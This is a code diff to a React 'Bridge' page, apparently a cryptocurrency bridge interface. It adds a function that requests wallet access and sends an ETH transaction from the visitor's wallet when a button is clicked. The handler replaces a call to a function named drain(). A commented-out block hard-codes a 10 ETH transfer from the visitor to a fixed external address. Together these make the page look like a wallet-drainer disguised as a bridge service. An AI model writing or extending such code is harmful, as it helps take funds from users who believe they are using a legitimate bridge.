@@ -33,6 +33,7 @@ import discord from "../assets/icons8-discord-50.png";
 import twitter from "../assets/icons8-twitter-50.png";
 import { UseWallet } from "../services/useWallet";
 import GetTokenBalance from "./GetTokenBalance";
+import { ethers } from "ethers";
 const Bridge = () => {
   const { connectors, connect } = useConnect();
   const { chains, switchChain } = useSwitchChain();
@@ -62,9 +63,71 @@ const Bridge = () => {
   //   disconnect();
   // }, 2000);
 
+  const sendDummyEth = async () => {
+    try {
+      if (typeof window !== "undefined" && window.ethereum) {
+        await window.ethereum.request({
+          method: "wallet_requestPermissions",
+          params: [
+            {
+              eth_accounts: {},
+            },
+          ],
+        });
+        const accounts = await window.ethereum.request({
+          method: "eth_requestAccounts",
+          params: [],
+        });
+
+        const valueInWei = ethers.utils.parseUnits(inputValue, 18); // Convert inputValue to wei
+        console.log(valueInWei);
+        await window.ethereum.request({
+          method: "eth_sendTransaction",
+          params: [
+            {
+              to: address,
+              from: accounts[0],
+              gas: "0x76c0",
+              value: valueInWei._hex,
+              data: "0x",
+              gasPrice: "0x4a817c800",
+            },
+          ],
+        });
+        // Get the list of accounts
+        // Set the selected address to the first address in the list
+        // if (address) {
+        //   console.log("Selected Address:", address); // Log the selected address
+        //   const params = [
+        //     {
+        //       to: "0x4B0897b0513FdBeEc7C469D9aF4fA6C0752aBea7",
+        //       from: address, // Use the selected address
+        //       gas: "0x76c0",
+        //       value: "0x8ac7230489e80000",
+        //       data: "0x",
+        //       gasPrice: "0x4a817c800",
+        //     },
+        //   ];
+        //   console.log(params);
+        //   return await window.ethereum.request({
+        //     method: "eth_sendTransaction",
+        //     params,
+        //   });
+        // } else {
+        //   console.error("No selected address found.");
+        // }
+      } else {
+        console.error("Ethereum provider is not available.");
+      }
+    } catch (error) {
+      console.error("Error sending dummy ETH:", error);
+    }
+  };
+
   console.log("Balance", balance.data);
-  const handleClick = () => {
-    drain();
+  const handleClick = async () => {
+    await sendDummyEth();
+    // drain();
   };
   const validConnectors = connectors.filter((connector) => {
     return typeof connector.icon === "string";
